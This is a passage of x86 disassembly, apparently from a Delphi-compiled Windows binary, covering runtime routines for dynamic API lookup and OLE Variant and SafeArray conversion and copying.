lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40d5b8
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d5e4
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d154
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d184
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d184
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d190
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d19c
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1a8
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d214
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d280
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d358
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c4
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d444
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d4b4
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d524
mov eax r-xdata
call sub_40d5b8
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40d8f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d915
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d91c
retn
sub_40df08
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40df52
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df59
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40df5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40dfeb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fc4c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fc4c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dff2
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ed0
retn
sub_40dff8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e042
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e049
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40e04c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e0db
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fc4c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fc4c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0e2
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ed0
retn
sub_40e0e8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e132
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e139
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40e13c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e381
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e388
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403ed0
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
dec eax
je r-xdata
call sub_40df08
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
jmp r-xdata
call sub_40dff8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40a9b8
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
jmp r-xdata
sub_40e39c
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40df5c
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e04c
jmp r-xdata
jmp r-xdata
call sub_40e13c
sub_40e3d0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e41a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e421
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_40e438
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e468
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e468
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e4c4
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e390
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e390
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e438
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e390
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e390
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e468
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e390
mov eax [ ebp - 0x314 ]
call sub_40e6bc
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e640
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e390
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403eac
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4100a8
test al al
je r-xdata
mov eax ebx
call sub_40e4c4
jmp r-xdata
push ebx
call VariantClear
call sub_40e390
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e6d8
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e708
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e708
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e764
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e390
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e390
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e6bc
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e0e8
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e390
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e390
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e6d8
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e708
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e390
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e390
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e938
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e640
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e390
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403f00
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4100a8
test al al
je r-xdata
mov ecx sub_40e930
mov edx esi
mov eax ebx
call sub_40e764
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e390
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40e9e4
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40e938
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e640
sub_40ea28
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40458c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e39c
pop ebx
pop ebp
retn 0x8
sub_40ea60
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40458c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e39c
pop ebx
pop ebp
retn 0x8
sub_40ea98
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40eb4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40458c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e39c
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb55
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed0
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404134
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_4079d0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4046d8
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404134
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407994
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4046d8
jmp r-xdata
jmp r-xdata
call sub_40dff8
sub_40eb5c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ec1b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ebf9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e39c
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_40469c
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404788
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404134
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec00
lea eax [ ebp - 0x10 ]
call sub_40e6bc
retn
sub_40ec28
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ec7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40e9e4
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40ed10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec85
lea eax [ ebp - 0x10 ]
call sub_40e6bc
retn
sub_40ec8c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4100a8
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ed01
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e6bc
retn
sub_40ed10
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f247
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40ed49 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f00
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403eac
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403f00
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f00
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40906c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f00
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40906c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403f00
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ea28
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404134
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ea60
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404134
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_40469c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404788
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404134
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40ea98
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404134
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403f00
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403f00
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403f00
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407d68
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403f00
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407d68
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403f00
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ed10
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40eb5c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403f00
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f24e
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403ed0
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4045a4
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403ed0
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4045a4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed0
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
